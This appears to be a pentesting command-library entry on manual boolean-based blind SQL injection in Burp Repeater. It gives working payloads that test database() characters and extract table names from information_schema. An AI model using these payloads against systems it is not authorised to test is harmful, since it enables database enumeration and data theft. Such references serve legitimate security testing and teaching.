---
id: cmd-manual-boolean-001
data: >-
  # Manual payload in Burp Repeater: Append ' AND (SELECT
  SUBSTRING(database(),1,1))='z' -- to parameter
tags:
  - sqli
  - boolean
  - manual
type: command
output: null
executor: gui
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.084Z'
verified: false
validated: true
submitted: true
---
# manual-boolean-payload

## Command

```bash
# In Burp Repeater: Modify request parameter with boolean SQL payload and send
```

## Description

Manually crafts and tests boolean SQL payloads to confirm injection points by comparing true/false responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload String | Boolean condition (e.g., AND 1=1) | Yes |
| Position | Character index in substring | No |
| Comparison | Value to test against (e.g., '=a') | Yes |

## Examples

### Basic Usage

```bash
# Payload: ' AND 1=1 -- (true condition)
```

### Advanced Usage

```bash
# Payload: ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))=97 -- (tests for 'a')
```

## Expected Output

Response variation: Full page for true, partial/empty for false, indicating successful boolean control.

## Related

- [[Related Procedure: Craft-Boolean-SQL-Payloads]]
